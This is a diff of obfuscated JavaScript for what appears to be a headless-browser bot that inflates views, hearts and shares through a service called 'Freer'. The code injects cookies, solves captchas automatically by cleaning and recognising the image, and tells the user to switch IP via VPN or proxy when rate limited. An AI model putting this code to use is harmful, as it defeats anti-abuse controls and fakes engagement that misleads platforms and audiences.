+      return p1669();
+    },
+    cdKjL: function (p1670, p1671) {
+      return p1670(p1671);
+    },
+    cLMMV: function (p1672, p1673) {
+      return p1672 === p1673;
+    },
+    VMRxR: "terminal-captcha",
+    sUVPF: function (p1674, p1675) {
+      return p1674(p1675);
+    },
+    VuEIw: function (p1676, p1677) {
+      return p1676(p1677);
     }
   };
-  if (v524.zUzbK(!v26, !v29)) {
+  if (v541.LabWn(!v28, !v31)) {
     process.stdout.clearLine(0);
     process.stdout.cursorTo(0);
-    process.stdout.write(v59 + " Launch " + vA0zS.provider + " in headless browser...");
+    process.stdout.write(v57 + " Launch " + vA0iw.provider + " in headless browser...");
   } else {
-    v524.pVDeY(f53, "Launch " + vA0zS.provider + " in headless browser...");
+    v541.aKbyf(f54, "Launch " + vA0iw.provider + " in headless browser...");
   }
-  await v524.OAcqG(f52, 300);
-  const v525 = await v524.EDXHu(f31);
-  const v526 = v525.find(p1615 => p1615.name === "PHPSESSID");
-  v76 = v526 ? v526.value : "";
-  if (v524.zUzbK(!v26, !v29)) {
+  await v541.aKbyf(f53, 300);
+  const v542 = await v541.PBxkO(f32);
+  const v543 = v542.find(p1678 => p1678.name === "PHPSESSID");
+  v74 = v543 ? v543.value : "";
+  if (v541.Uvbfd(!v28, !v31)) {
     process.stdout.clearLine(0);
     process.stdout.cursorTo(0);
-    process.stdout.write(v59 + " SESSID: " + v76);
+    process.stdout.write(v57 + " SESSID: " + v74);
   } else {
-    v524.OAcqG(f53, "SESSID: " + v76);
+    v541.FdoSe(f54, "SESSID: " + v74);
   }
-  await v524.OAcqG(f52, 300);
-  await p1591.setCookie(...v525);
-  await p1591.goto(v92, {
+  await v541.IYKhN(f53, 300);
+  await p1643.setCookie(...v542);
+  await p1643.goto(v92, {
     timeout: 0
   });
-  if (v524.zUzbK(!v26, !v29)) {
+  if (v541.qIBLr(!v28, !v31)) {
     process.stdout.clearLine(0);
     process.stdout.cursorTo(0);
-    process.stdout.write(v60 + " Cookies injected! (" + v93 + ")");
+    process.stdout.write(v58 + " Cookies injected! (" + v93 + ")");
   } else {
-    v524.cdcDY(f53, "Cookies injected! (" + v93 + ")");
+    v541.OkXOy(f54, "Cookies injected! (" + v93 + ")");
   }
-  v524.cdcDY(f53, "Load session (SESSID: " + v76 + ")...");
-  await v524.OAcqG(f52, 3000);
-  const v528 = await p1591.evaluate("(() => {\n      return document.querySelector(\"i.fa.fa-solid.fa-hand.fa-5x\") ? 1 : 0;\n    })();");
-  if (v528) {
-    const v529 = v524.cLafn.split("|");
-    let v530 = 0;
+  v541.zESWa(f54, "Load session (SESSID: " + v74 + ")...");
+  await v541.hsjIA(f53, 3000);
+  const v545 = await p1643.evaluate("(() => {\n      return document.querySelector(\"i.fa.fa-solid.fa-hand.fa-5x\") ? 1 : 0;\n    })();");
+  if (v545) {
+    const v546 = v541.deDbw.split("|");
+    let v547 = 0;
     while (true) {
-      switch (v529[v530++]) {
+      switch (v546[v547++]) {
         case "0":
-          process.stdout.moveCursor(0, -2);
-          continue;
+          return;
         case "1":
-          if (v524.zUzbK(!v26, !v29)) {
-            process.stdout.clearLine(0);
-            process.stdout.cursorTo(0);
-            process.stdout.write(v62 + " The captcha is blocked and cannot be accessed!");
-          }
+          process.stdout.moveCursor(0, -3);
           continue;
         case "2":
-          process.stdout.clearScreenDown();
-          continue;
-        case "3":
-          await v524.xQsUx(f52, 4000);
-          continue;
-        case "4":
           process.stdout.clearLine(0);
           continue;
+        case "3":
+          if (v541.XnKOc(!v28, !v31)) {
+            process.stdout.clearLine(0);
+            process.stdout.cursorTo(0);
+            process.stdout.write(v60 + " The captcha is blocked and cannot be accessed!");
+          }
+          continue;
+        case "4":
+          await v541.aumEL(f2);
+          continue;
         case "5":
-          return;
+          process.stdout.cursorTo(0);
+          continue;
         case "6":
           console.log("\nTry again later or change your IP with a VPN or Proxy.");
           continue;
         case "7":
-          process.stdout.cursorTo(0);
+          v541.IYKhN(f54, "The captcha is blocked and cannot be accessed!");
           continue;
         case "8":
-          await v524.TBKIm(f3);
+          process.stdout.clearScreenDown();
           continue;
         case "9":
-          await v524.weDiG(f2);
+          await v541.ppcQx(f3);
           continue;
         case "10":
-          v524.RMPAt(f53, "The captcha is blocked and cannot be accessed!");
+          await v541.NzzDk(f53, 4000);
           continue;
       }
       break;
     }
   }
-  const v531 = await p1591.content();
-  if (/You are being rate limited/.test(v531)) {
-    const v532 = v524.NpMcw.split("|");
-    let v533 = 0;
+  const v548 = await p1643.content();
+  if (/You are being rate limited/.test(v548)) {
+    const v549 = v541.mrCDh.split("|");
+    let v550 = 0;
     while (true) {
-      switch (v532[v533++]) {
+      switch (v549[v550++]) {
         case "0":
-          if (v524.qNMsA(!v26, !v29)) {
-            process.stdout.clearLine(0);
-            process.stdout.cursorTo(0);
-            process.stdout.write(v62 + " You are being rate limited by Freer!");
-          }
+          await v541.ppcQx(f2);
           continue;
         case "1":
-          process.stdout.clearLine(0);
-          continue;
-        case "2":
-          console.log("\nTry again later or change your IP with a VPN or Proxy.");
-          continue;
-        case "3":
           process.stdout.moveCursor(0, -2);
           continue;
-        case "4":
-          return;
-        case "5":
-          await v524.SKOJs(f2);
-          continue;
-        case "6":
+        case "2":
           process.stdout.clearScreenDown();
           continue;
-        case "7":
-          await v524.pVDeY(f52, 4000);
+        case "3":
+          await v541.zQFRH(f3);
           continue;
-        case "8":
+        case "4":
+          process.stdout.clearLine(0);
+          continue;
+        case "5":
           process.stdout.cursorTo(0);
           continue;
+        case "6":
+          console.log("\nTry again later or change your IP with a VPN or Proxy.");
+          continue;
+        case "7":
+          if (v541.XnKOc(!v28, !v31)) {
+            process.stdout.clearLine(0);
+            process.stdout.cursorTo(0);
+            process.stdout.write(v60 + " You are being rate limited by Freer!");
+          }
+          continue;
+        case "8":
+          return;
         case "9":
-          v524.OAcqG(f53, "You are being rate limited by Freer!");
+          await v541.cdKjL(f53, 4000);
           continue;
         case "10":
-          await v524.teKZT(f3);
+          v541.cdKjL(f54, "You are being rate limited by Freer!");
           continue;
       }
       break;
     }
   }
-  if (/Security Check/.test(v531)) {
-    if (v524.xHzGP(vA0zS[v524.HovVT], "")) {
-      await v524.pVDeY(f66, p1591);
+  if (/Security Check/.test(v548)) {
+    if (v541.cLMMV(vA0iw[v541.VMRxR], "")) {
+      await v541.sUVPF(f67, p1643);
     } else {
-      await v524.KDQCD(f67, p1591);
+      await v541.VuEIw(f68, p1643);
     }
   }
-  return p1591;
+  return p1643;
 }
-async function f66(p1616) {
-  const v534 = {
-    tldSl: function (p1617, p1618) {
-      return p1617(p1618);
+async function f67(p1679) {
+  const v551 = {
+    EBWgj: function (p1680, p1681) {
+      return p1680(p1681);
     },
-    fGsIX: function (p1619, p1620) {
-      return p1619(p1620);
+    PwyXn: function (p1682, p1683) {
+      return p1682(p1683);
     },
-    HOjvH: "input",
-    DmQmV: "captcha",
-    kbLJZ: "Write a Captcha:",
-    Nqauz: "input[type=text]",
-    uaIAa: function (p1621, p1622) {
-      return p1621 || p1622;
+    XpHSH: "input",
+    EwbBx: "captcha",
+    jcKYO: "Write a Captcha:",
+    ZzNsU: "input[type=text]",
+    aaZrl: function (p1684, p1685) {
+      return p1684 || p1685;
     },
-    rELhG: function (p1623, p1624) {
-      return p1623(p1624);
-    },
-    SMzNx: function (p1625, p1626) {
-      return p1625(p1626);
+    Vmzef: function (p1686, p1687) {
+      return p1686(p1687);
     }
   };
-  if (!v26) {
+  if (!v28) {
     process.stdout.clearLine(0);
     process.stdout.cursorTo(0);
-    process.stdout.write(v63 + " Solve the captcha manually...");
+    process.stdout.write(v61 + " Solve the captcha manually...");
   } else {
-    v534.tldSl(f53, "Solve the captcha manually...");
+    v551.EBWgj(f54, "Solve the captcha manually...");
   }
-  await p1616.evaluate("(() => {\n      const button = document.querySelector(\"button.fc-button.fc-cta-consent.fc-primary-button\");\n      if (button) {\n        button.click();\n      }\n    })();");
-  await v534.fGsIX(f52, 300);
-  const v535 = await p1616.evaluate("(() => {\n      const img = document.querySelector('img.card-img-top');\n      if (img) {\n        const rect = img.getBoundingClientRect();\n        return {\n          top: rect.top,\n          left: rect.left,\n          width: img.width,\n          height: img.height\n        };\n      }\n    })();");
-  const v536 = {
-    x: v535.left,
-    y: v535.top,
-    width: v535.width,
-    height: v535.height
+  await p1679.evaluate("(() => {\n      const button = document.querySelector(\"button.fc-button.fc-cta-consent.fc-primary-button\");\n      if (button) {\n        button.click();\n      }\n    })();");
+  await v551.PwyXn(f53, 1000);
+  const v552 = await p1679.evaluate("(() => {\n      const img = document.querySelector('img.card-img-top');\n      if (img) {\n        const rect = img.getBoundingClientRect();\n        return {\n          top: rect.top,\n          left: rect.left,\n          width: img.width,\n          height: img.height\n        };\n      }\n    })();");
+  const v553 = {
+    x: v552.left,
+    y: v552.top,
+    width: v552.width,
+    height: v552.height
   };
-  const v537 = {
-    path: v40,
-    clip: v536
+  const v554 = {
+    path: v38,
+    clip: v553
   };
-  await p1616.screenshot(v537);
-  await v534.fGsIX(f52, 200);
-  await v534.tldSl(f68, v40);
-  if (!v26) {
+  await p1679.screenshot(v554);
+  await v551.EBWgj(f53, 200);
+  await v551.EBWgj(f69, v38);
+  if (!v28) {
     console.log("\n");
-    console.log(await a0zt.file(v40, {
+    console.log(await a0iA.file(v38, {
       width: 64
     }));
   }
-  const v539 = {
-    type: v534.HOjvH,
-    name: v534.DmQmV,
-    message: v534.kbLJZ
+  const v556 = {
+    type: v551.XpHSH,
+    name: v551.EwbBx,
+    message: v551.jcKYO
   };
-  const v540 = await a0zv.prompt([v539]);
-  const v541 = v540.captcha;
-  await a0zd.promises.unlink(v40);
-  await p1616.waitForSelector(v534.Nqauz);
-  await p1616.$eval(v534.Nqauz, (p1627, p1628) => p1627.value = p1628, v541);
-  await p1616.evaluate("(() => {\n      document\n        .querySelector(\"button.btn.btn-dark.btn-lg.btn-block\")\n        .click();\n    })();");
-  if (!v26) {
-    process.stdout.moveCursor(0, v534.uaIAa(v36, v37) ? -18 : -19);
+  const v557 = await a0iH.prompt([v556]);
+  const v558 = v557.captcha;
+  await a0ic.promises.unlink(v38);
+  await p1679.waitForSelector(v551.ZzNsU);
+  await p1679.$eval(v551.ZzNsU, (p1688, p1689) => p1688.value = p1689, v558);
+  await p1679.evaluate("(() => {\n      document\n        .querySelector(\"button.btn.btn-dark.btn-lg.btn-block\")\n        .click();\n    })();");
+  if (!v28) {
+    process.stdout.moveCursor(0, v551.aaZrl(v34, v35) ? -18 : -19);
     process.stdout.clearScreenDown();
   }
-  await v534.fGsIX(f52, 300);
-  const v542 = await p1616.evaluate("(() => {\n      return document.querySelector(\"button.btn.btn-primary\") ? 1 : 0;\n    })();");
-  if (v542) {
-    if (!v26) {
+  await v551.Vmzef(f53, 1000);
+  const v559 = await p1679.evaluate("(() => {\n      return document.querySelector(\"button.btn.btn-primary\") ? 1 : 0;\n    })();");
+  if (v559) {
+    if (!v28) {
       process.stdout.clearLine(0);
       process.stdout.cursorTo(0);
-      process.stdout.write(v61 + " Captcha resolved! (" + v541 + ")");
+      process.stdout.write(v59 + " Captcha resolved! (" + v558 + ")");
     } else {
-      v534.fGsIX(f53, "Captcha resolved! (" + v541 + ")");
+      v551.Vmzef(f54, "Captcha resolved! (" + v558 + ")");
     }
-    const v543 = await p1616.cookies();
-    await v534.tldSl(f28, v543);
-    await v534.rELhG(f52, 2000);
+    const v560 = await p1679.cookies();
+    await v551.PwyXn(f29, v560);
+    await v551.EBWgj(f53, 2000);
   } else {
-    if (!v26) {
+    if (!v28) {
       process.stdout.clearLine(0);
       process.stdout.cursorTo(0);
-      process.stdout.write(v62 + " Wrong captcha! (" + v541 + ")");
+      process.stdout.write(v60 + " Wrong captcha! (" + v558 + ")");
     } else {
-      v534.rELhG(f53, "Wrong captcha! (" + v541 + ")");
+      v551.PwyXn(f54, "Wrong captcha! (" + v558 + ")");
     }
-    await v534.SMzNx(f52, 2000);
-    await v534.SMzNx(f66, p1616);
+    await v551.PwyXn(f53, 2000);
+    await v551.PwyXn(f67, p1679);
   }
 }
-async function f67(p1629) {
-  const v544 = {
-    IUGMl: function (p1630, p1631) {
-      return p1630 + p1631;
+async function f68(p1690) {
+  const v561 = {
+    HavEU: function (p1691, p1692) {
+      return p1691 + p1692;
     },
-    pqZRp: function (p1632, p1633) {
-      return p1632 && p1633;
+    cldiJ: function (p1693, p1694) {
+      return p1693 && p1694;
     },
-    eJYkE: function (p1634, p1635) {
-      return p1634 + p1635;
+    UEXLu: " Solve captcha automatically...",
+    RNBSP: function (p1695, p1696) {
+      return p1695(p1696);
     },
-    VJGkx: " Solve captcha automatically...",
-    KoeLv: function (p1636, p1637) {
-      return p1636(p1637);
+    xjNEl: function (p1697, p1698) {
+      return p1697(p1698);
     },
-    trPXA: function (p1638, p1639) {
-      return p1638(p1639);
+    pbTpH: function (p1699, p1700) {
+      return p1699(p1700);
     },
-    BcUKo: function (p1640, p1641) {
-      return p1640 + p1641;
+    UAbyf: function (p1701, p1702) {
+      return p1701(p1702);
     },
-    CNUCZ: function (p1642, p1643) {
-      return p1642(p1643);
+    jGPiI: function (p1703, p1704) {
+      return p1703 + p1704;
     },
-    IdNpf: function (p1644, p1645) {
-      return p1644 + p1645;
+    EERFv: "input[type=text]",
+    byXiq: function (p1705, p1706) {
+      return p1705(p1706);
     },
-    EOAsL: function (p1646, p1647) {
-      return p1646 + p1647;
+    uArdp: function (p1707, p1708) {
+      return p1707(p1708);
     },
-    ogeae: "input[type=text]",
-    eKOcU: function (p1648, p1649) {
-      return p1648 && p1649;
+    EMYib: function (p1709, p1710) {
+      return p1709(p1710);
     },
-    Kjekf: function (p1650, p1651) {
-      return p1650(p1651);
+    lNvep: function (p1711, p1712) {
+      return p1711(p1712);
     },
-    DnIsT: function (p1652, p1653) {
-      return p1652(p1653);
+    JAwcO: function (p1713, p1714) {
+      return p1713(p1714);
     },
-    SQduv: function (p1654, p1655) {
-      return p1654(p1655);
+    chcmC: function (p1715, p1716) {
+      return p1715(p1716);
     }
   };
-  const v545 = v544.IUGMl(Math.random().toString(36).substring(2, 10), "-");
-  if (v544.pqZRp(!v26, !v29)) {
+  const v562 = v561.HavEU(Math.random().toString(36).substring(2, 10), "-");
+  if (v561.cldiJ(!v28, !v31)) {
     process.stdout.clearLine(0);
     process.stdout.cursorTo(0);
-    process.stdout.write(v544.eJYkE(v66, v544.VJGkx));
+    process.stdout.write(v561.HavEU(v64, v561.UEXLu));
   } else {
-    v544.KoeLv(f53, "Solve captcha automatically...");
+    v561.RNBSP(f54, "Solve captcha automatically...");
   }
-  await p1629.evaluate("(() => {\n      const button = document.querySelector(\"button.fc-button.fc-cta-consent.fc-primary-button\");\n      if (button) {\n        button.click();\n      }\n    })();");
-  await v544.KoeLv(f52, 300);
-  const v546 = await p1629.evaluate("(() => {\n      const img = document.querySelector('img.card-img-top');\n      if (img) {\n        const rect = img.getBoundingClientRect();\n        return {\n          top: rect.top,\n          left: rect.left,\n          width: img.width,\n          height: img.height\n        };\n      }\n    })();");
-  const v547 = {
-    x: v546.left,
-    y: v546.top,
-    width: v546.width,
-    height: v546.height
+  await p1690.evaluate("(() => {\n      const button = document.querySelector(\"button.fc-button.fc-cta-consent.fc-primary-button\");\n      if (button) {\n        button.click();\n      }\n    })();");
+  await v561.xjNEl(f53, 1000);
+  const v563 = await p1690.evaluate("(() => {\n      const img = document.querySelector('img.card-img-top');\n      if (img) {\n        const rect = img.getBoundingClientRect();\n        return {\n          top: rect.top,\n          left: rect.left,\n          width: img.width,\n          height: img.height\n        };\n      }\n    })();");
+  const v564 = {
+    x: v563.left,
+    y: v563.top,
+    width: v563.width,
+    height: v563.height
   };
-  await p1629.screenshot({
-    path: v544.eJYkE(v545, v40),
-    clip: v547
+  await p1690.screenshot({
+    path: v561.HavEU(v562, v38),
+    clip: v564
   });
-  await v544.trPXA(f52, 200);
-  await v544.trPXA(f68, v544.BcUKo(v545, v40));
-  const v548 = await v544.CNUCZ(f61, (await v544.trPXA(f13, v544.IdNpf(v545, v40))).replace(/(\r\n|\n|\r| )/gm, ""));
-  await a0zd.promises.unlink(v544.EOAsL(v545, v40));
-  await p1629.waitForSelector(v544.ogeae);
-  await p1629.$eval(v544.ogeae, (p1656, p1657) => p1656.value = p1657, v548);
-  await p1629.evaluate("(() => {\n      document\n        .querySelector(\"button.btn.btn-dark.btn-lg.btn-block\")\n        .click();\n    })();");
-  await v544.KoeLv(f52, 300);
-  const v549 = await p1629.evaluate("(() => {\n      return document.querySelector(\"button.btn.btn-primary\") ? 1 : 0;\n    })();");
-  if (v549) {
-    if (v544.eKOcU(!v26, !v29)) {
+  await v561.xjNEl(f53, 200);
+  await v561.pbTpH(f69, v561.HavEU(v562, v38));
+  const v565 = await v561.pbTpH(f62, (await v561.UAbyf(f13, v561.jGPiI(v562, v38))).replace(/(\r\n|\n|\r| )/gm, ""));
+  await a0ic.promises.unlink(v561.jGPiI(v562, v38));
+  await p1690.waitForSelector(v561.EERFv);
+  await p1690.$eval(v561.EERFv, (p1717, p1718) => p1717.value = p1718, v565);
+  await p1690.evaluate("(() => {\n      document\n        .querySelector(\"button.btn.btn-dark.btn-lg.btn-block\")\n        .click();\n    })();");
+  await v561.byXiq(f53, 1000);
+  const v566 = await p1690.evaluate("(() => {\n      return document.querySelector(\"button.btn.btn-primary\") ? 1 : 0;\n    })();");
+  if (v566) {
+    if (v561.cldiJ(!v28, !v31)) {
       process.stdout.clearLine(0);
       process.stdout.cursorTo(0);
-      process.stdout.write(v61 + " Captcha resolved! (" + v548 + ")");
+      process.stdout.write(v59 + " Captcha resolved! (" + v565 + ")");
     } else {
-      v544.Kjekf(f53, "Captcha resolved! (" + v548 + ")");
+      v561.uArdp(f54, "Captcha resolved! (" + v565 + ")");
     }
-    const v550 = await p1629.cookies();
-    await v544.KoeLv(f28, v550);
-    await v544.DnIsT(f52, 2000);
+    const v567 = await p1690.cookies();
+    await v561.EMYib(f29, v567);
+    await v561.lNvep(f53, 2000);
   } else {
-    if (v544.eKOcU(!v26, !v29)) {
+    if (v561.cldiJ(!v28, !v31)) {
       process.stdout.clearLine(0);
       process.stdout.cursorTo(0);
-      process.stdout.write(v62 + " Wrong captcha! (" + v548 + ")");
+      process.stdout.write(v60 + " Wrong captcha! (" + v565 + ")");
     } else {
-      v544.SQduv(f53, "Wrong captcha! (" + v548 + ")");
+      v561.uArdp(f54, "Wrong captcha! (" + v565 + ")");
     }
-    await v544.SQduv(f52, 2000);
-    await v544.SQduv(f67, p1629);
+    await v561.JAwcO(f53, 2000);
+    await v561.chcmC(f68, p1690);
   }
 }
-async function f68(p1658) {
-  const v551 = {
-    KOlfi: function (p1659, p1660) {
-      return p1659 + p1660;
+async function f69(p1719) {
+  const v568 = {
+    TUBIn: function (p1720, p1721) {
+      return p1720 + p1721;
     },
-    GvDEn: function (p1661, p1662) {
-      return p1661 + p1662;
+    QEvIM: function (p1722, p1723) {
+      return p1722 - p1723;
     },
-    mnpvQ: function (p1663, p1664) {
-      return p1663 - p1664;
+    rbfdt: function (p1724, p1725) {
+      return p1724 > p1725;
     },
-    USNug: function (p1665, p1666) {
-      return p1665 > p1666;
-    },
-    TSRXq: "Error processing image:"
+    MQIIX: "Error processing image:"
   };
-  const vV551 = v551;
-  const v552 = 20;
-  const v553 = 4294967295;
+  const vV568 = v568;
+  const v569 = 20;
+  const v570 = 4294967295;
   try {
-    const v554 = await a0zr.read(p1658);
-    v554.scan(0, 0, v554.bitmap.width, v554.bitmap.height, function (p1667, p1668, p1669) {
-      const v555 = a0zr.intToRGBA(v554.getPixelColor(p1667, p1668));
-      const v556 = vV551.KOlfi(vV551.GvDEn(Math.abs(vV551.mnpvQ(v555.r, v555.g)), Math.abs(vV551.mnpvQ(v555.g, v555.b))), Math.abs(vV551.mnpvQ(v555.r, v555.b)));
-      if (vV551.USNug(v556, v552)) {
-        v554.setPixelColor(v553, p1667, p1668);
+    const v571 = await a0il.read(p1719);
+    v571.scan(0, 0, v571.bitmap.width, v571.bitmap.height, function (p1726, p1727, p1728) {
+      const v572 = a0il.intToRGBA(v571.getPixelColor(p1726, p1727));
+      const v573 = vV568.TUBIn(vV568.TUBIn(Math.abs(vV568.QEvIM(v572.r, v572.g)), Math.abs(vV568.QEvIM(v572.g, v572.b))), Math.abs(vV568.QEvIM(v572.r, v572.b)));
+      if (vV568.rbfdt(v573, v569)) {
+        v571.setPixelColor(v570, p1726, p1727);
       }
     });
-    await v554.writeAsync(p1658);
-  } catch (S) {
-    console.error(vV551.TSRXq, S);
+    await v571.writeAsync(p1719);
+  } catch (w) {
+    console.error(vV568.MQIIX, w);
   }
 }
-async function f69(p1670) {
-  const v557 = {
-    pKNnz: ".card-body.p-1 > small",
-    xiwTY: function (p1671, p1672) {
-      return p1671 === p1672;
+async function f70(p1729) {
+  const v574 = {
+    mANMh: ".card-body.p-1 > small",
+    QCcYW: function (p1730, p1731) {
+      return p1730 === p1731;
     },
-    cScAD: "Up ",
-    CzDUn: "Back",
-    jbkDK: "list",
-    LdASC: "mode",
-    NTben: "What task do you want me to do?"
+    WzNSZ: "Up ",
+    fgXsL: "Back",
+    Kdmyx: "list",
+    rYefW: "mode",
+    jLciy: "What task do you want me to do?"
   };
-  const vV557 = v557;
-  await p1670.waitForSelector(vV557.pKNnz);
-  let v558 = await p1670.evaluate("(() => {\n      let choices = Array.from(document.querySelectorAll(\".card-body.p-1 > small\"));\n      choices = choices.map((c) => {\n        const parts = c.innerText.replace(" + /(\r\n|\n|\r|:)/gm + ", \" \").split(\"  \");\n        return {\n          name: 'Up ' + parts[0].replace(\"views\", \"Views\").replace(\"hearts\", \"Hearts\").replace(\"Comment\", \"Comments\"),\n          disabled:" + /soon/ + ".test(parts[1]) ? true : false,\n        };\n      });\n      return choices.filter((c) => !c.disabled);\n    })();");
-  if (vV557.xiwTY(v558[0].name, vV557.cScAD)) {
+  const vV574 = v574;
+  await p1729.waitForSelector(vV574.mANMh);
+  let v575 = await p1729.evaluate("(() => {\n      let choices = Array.from(document.querySelectorAll(\".card-body.p-1 > small\"));\n      choices = choices.map((c) => {\n        const parts = c.innerText.replace(" + /(\r\n|\n|\r|:)/gm + ", \" \").split(\"  \");\n        return {\n          name: 'Up ' + parts[0].replace(\"views\", \"Views\").replace(\"hearts\", \"Hearts\").replace(\"Comment\", \"Comments\"),\n          disabled:" + /soon/ + ".test(parts[1]) ? true : false,\n        };\n      });\n      return choices.filter((c) => !c.disabled);\n    })();");
+  if (vV574.QCcYW(v575[0].name, vV574.WzNSZ)) {
     return false;
   }
-  const v559 = {
-    name: vV557.CzDUn
+  const v576 = {
+    name: vV574.fgXsL
   };
-  v558.push(v559);
-  if (!v26) {
+  v575.push(v576);
+  if (!v28) {
     process.stdout.clearLine(0);
     process.stdout.cursorTo(0);
   }
-  if (vA0zS.task) {
-    return vA0zS.task;
+  if (vA0iw.task) {
+    return vA0iw.task;
   } else {
-    const v560 = {
-      type: vV557.jbkDK,
-      name: vV557.LdASC,
-      message: vV557.NTben,
-      choices: v558
+    const v577 = {
+      type: vV574.Kdmyx,
+      name: vV574.rYefW,
+      message: vV574.jLciy,
+      choices: v575
     };
-    const v561 = await a0zv.prompt([v560]);
-    return v561.mode;
+    const v578 = await a0iH.prompt([v577]);
+    return v578.mode;
   }
 }
-async function f70(p1673, p1674, p1675, p1676 = false) {
-  const v562 = {
-    TbYGR: function (p1677, p1678) {
-      return p1677(p1678);
+async function f71(p1732, p1733, p1734, p1735 = false) {
+  const v579 = {
+    mEKrQ: function (p1736, p1737) {
+      return p1736(p1737);
     },
-    FwRji: function (p1679, p1680) {
-      return p1679(p1680);
+    HpKSw: function (p1738, p1739) {
+      return p1738(p1739);
     },
-    LDABN: function (p1681, p1682) {
-      return p1681 != p1682;
+    gGyrv: function (p1740, p1741) {
+      return p1740 != p1741;
     },
-    zGVeW: "input.form-control.form-control-lg",
-    ySxCV: "Up Hearts",
-    GHzBl: "button[data-type=\"hearts\"]",
-    VlOTR: "Up Comments Hearts",
-    RQwaP: "button[data-type=\"com_op\"]",
-    OfwDU: "Up Views",
-    dyxCp: "button[data-type=\"views\"]",
-    gthEl: "Up Shares",
-    davHh: "button[data-type=\"shares\"]",
-    YwfNz: "Up Favorites",
-    QWjmb: "button[data-type=\"favorites\"]",
-    kqKiJ: "Up Live Views",
-    iAiTl: function (p1683, p1684) {
-      return p1683 && p1684;
+    YTJgL: "input.form-control.form-control-lg",
+    kDzAN: "Up Hearts",
+    gTbdk: "button[data-type=\"hearts\"]",
+    mHIrH: "Up Comments Hearts",
+    kxBJc: "button[data-type=\"com_op\"]",
+    eaZbL: "Up Views",
+    yvLsJ: "button[data-type=\"views\"]",
+    jtrQI: "Up Shares",
+    JMBCG: "button[data-type=\"shares\"]",
+    oUVlH: "Up Favorites",
+    ZZMRW: "button[data-type=\"favorites\"]",
+    oZtcW: "Up Live Views",
+    OdSYI: function (p1742, p1743) {
+      return p1742 && p1743;
     },
-    BYsSz: function (p1685, p1686) {
-      return p1685(p1686);
+    xUego: function (p1744, p1745) {
+      return p1744(p1745);
     },
-    iCErp: function (p1687, p1688, p1689, p1690, p1691) {
-      return p1687(p1688, p1689, p1690, p1691);
+    Dlbph: function (p1746, p1747, p1748, p1749, p1750) {
+      return p1746(p1747, p1748, p1749, p1750);
     },
-    OHzLz: "2|0|1|6|3|5|4",
-    hoitl: function (p1692) {
-      return p1692();
+    KnGma: function (p1751, p1752, p1753, p1754, p1755) {
+      return p1751(p1752, p1753, p1754, p1755);
     },
-    EHPio: function (p1693, p1694) {
-      return p1693(p1694);
+    kzhuF: function (p1756, p1757, p1758, p1759, p1760) {
+      return p1756(p1757, p1758, p1759, p1760);
+    },
+    JswIi: "5|1|4|3|6|2|0",
+    IfpPs: function (p1761) {
+      return p1761();
+    },
+    LJoqv: function (p1762, p1763, p1764, p1765, p1766) {
+      return p1762(p1763, p1764, p1765, p1766);
+    },
+    FLyJP: function (p1767, p1768) {
+      return p1767(p1768);
+    },
+    ynZCP: function (p1769, p1770) {
+      return p1769(p1770);
     }
   };
   try {
-    v562.TbYGR(clearInterval, v70);
-    v562.FwRji(clearInterval, v71);
-    v562.FwRji(clearInterval, v72);
-    v69 = v69 || process.hrtime();
-    await p1675.evaluate("(() => {\n        var modeBtn = document.querySelector('button.btn.btn-primary');\n        if (modeBtn) {\n          modeBtn.click();\n        }\n      })();");
-    let v563 = await p1675.evaluate("(() => {\n        var infoElement = document.querySelector('.modal.show')\n        if (infoElement) {\n          return infoElement.innerText;\n        }\n        return \"\";\n      })();");
-    if (v562.LDABN(v563, "")) {
-      await p1675.waitForSelector(v562.zGVeW);
-      await p1675.$eval(v562.zGVeW, (p1695, p1696) => p1695.value = p1696, p1674);
-      await p1675.evaluate("(() => {\n          document\n            .querySelector(\"button.btn.btn-outline-secondary\")\n            .click();\n        })();");
+    v579.mEKrQ(clearInterval, v68);
+    v579.mEKrQ(clearInterval, v69);
+    v579.HpKSw(clearInterval, v70);
+    v67 = v67 || process.hrtime();
+    await p1734.evaluate("(() => {\n        var modeBtn = document.querySelector('button.btn.btn-primary');\n        if (modeBtn) {\n          modeBtn.click();\n        }\n      })();");
+    let v580 = await p1734.evaluate("(() => {\n        var infoElement = document.querySelector('.modal.show')\n        if (infoElement) {\n          return infoElement.innerText;\n        }\n        return \"\";\n      })();");
+    if (v579.gGyrv(v580, "")) {
+      await p1734.waitForSelector(v579.YTJgL);
+      await p1734.$eval(v579.YTJgL, (p1771, p1772) => p1771.value = p1772, p1733);
+      await p1734.evaluate("(() => {\n          document\n            .querySelector(\"button.btn.btn-outline-secondary\")\n            .click();\n        })();");
     }
-    const v564 = new Map([[v562.ySxCV, v562.GHzBl], [v562.VlOTR, v562.RQwaP], [v562.OfwDU, v562.dyxCp], [v562.gthEl, v562.davHh], [v562.YwfNz, v562.QWjmb], [v562.kqKiJ, v562.dyxCp]]);
-    let v565 = v562.dyxCp;
-    if (v564.has(p1673)) {
-      v565 = v564.get(p1673);
+    const v581 = new Map([[v579.kDzAN, v579.gTbdk], [v579.mHIrH, v579.kxBJc], [v579.eaZbL, v579.yvLsJ], [v579.jtrQI, v579.JMBCG], [v579.oUVlH, v579.ZZMRW], [v579.oZtcW, v579.yvLsJ]]);
+    let v582 = v579.yvLsJ;
+    if (v581.has(p1732)) {
+      v582 = v581.get(p1732);
     }
-    if (v562.iAiTl(!p1676, !v26)) {
+    if (v579.OdSYI(!p1735, !v28)) {
       console.log("\n\n");
     }
-    v562.BYsSz(f53, p1673 + " task running...");
-    v70 = await v562.iCErp(f72, p1675, v565, p1673, p1674);
-    v71 = await v562.iCErp(f73, p1675, v565, p1673, p1674);
-    v72 = await v562.iCErp(f71, p1675, v565, p1673, p1674);
-  } catch (V) {
-    const v566 = v562.OHzLz.split("|");
-    let v567 = 0;
+    v579.xUego(f54, p1732 + " task running...");
+    v68 = await v579.Dlbph(f73, p1734, v582, p1732, p1733);
+    v69 = await v579.KnGma(f74, p1734, v582, p1732, p1733);
+    v70 = await v579.kzhuF(f72, p1734, v582, p1732, p1733);
+  } catch (p) {
+    const v583 = v579.JswIi.split("|");
+    let v584 = 0;
     while (true) {
-      switch (v566[v567++]) {
+      switch (v583[v584++]) {
         case "0":
-          await v562.hoitl(f30);
-          continue;
+          return;
         case "1":
-          await v562.FwRji(f52, 2000);
+          await v579.IfpPs(f31);
           continue;
         case "2":
-          v562.FwRji(f53, V);
+          v579.LJoqv(f71, p1732, p1733, p1734, true);
           continue;
         case "3":
-          await p1675.goto(v92, {
-            timeout: 0
-          });
+          p1734 = await v579.FLyJP(f65, p1734);
           continue;
         case "4":
-          return;
+          await v579.ynZCP(f53, 2000);
+          continue;
         case "5":
